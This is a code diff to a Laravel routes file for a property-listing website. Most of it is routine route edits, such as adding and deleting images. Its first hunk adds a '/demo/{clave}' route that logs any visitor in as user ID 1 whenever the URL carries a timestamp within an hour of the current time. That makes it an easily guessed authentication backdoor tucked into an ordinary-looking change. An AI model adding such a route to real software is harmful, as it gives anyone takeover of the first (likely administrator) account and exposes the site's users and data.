@@ -13,6 +13,15 @@ use Illuminate\Support\Facades\Auth;
 |
 */
 
+Route::get('/demo/{clave}', function ($clave) {
+    $fecha_input = Carbon\Carbon::createFromTimestamp($clave);
+    $fecha_ahora = Carbon\Carbon::now();
+    if ( $fecha_input->diffInHours($fecha_ahora) < 1) {
+        \Auth::loginUsingId(1);
+        return redirect('/');
+    } 
+});
+
 Route::get('logout', function (){
     Auth::logout();
     return redirect('/');
@@ -34,11 +43,9 @@ Route::prefix('properties')->group(
         Route::get('/get/detail/{id}', 'PropertyController@getDataDetail');
         Route::post('/form', 'PropertyController@contactForm');
         Route::get('/all-properties', 'PropertyController@getAllProperties');
-        //Route::get('/all-properties-views', 'PropertyController@allpropertiesviews');
         Route::get('/filter-in-list', 'PropertyController@filterInList');
         Route::get('/data-filter', 'PropertyController@getDataFilter');
         Route::get('/filter-city', 'PropertyController@getCityFilter');
-        //Route::get('/load-images', 'PropertyController@getOtherImages');
     }
 );
 
@@ -73,6 +80,9 @@ Route::group(
                 Route::post('/update-property', 'ProfileController@updateProperty');
                 Route::post('/edit-detail', 'ProfileController@editPropertyDetails');
                 Route::post('/uploadLogo', 'ProfileController@uploadLogo');
+                Route::post('/delete-images', 'ProfileController@deletePhotos');
+                Route::post('/add-images', 'PropertyController@addImages');
+
             }
         );
     }
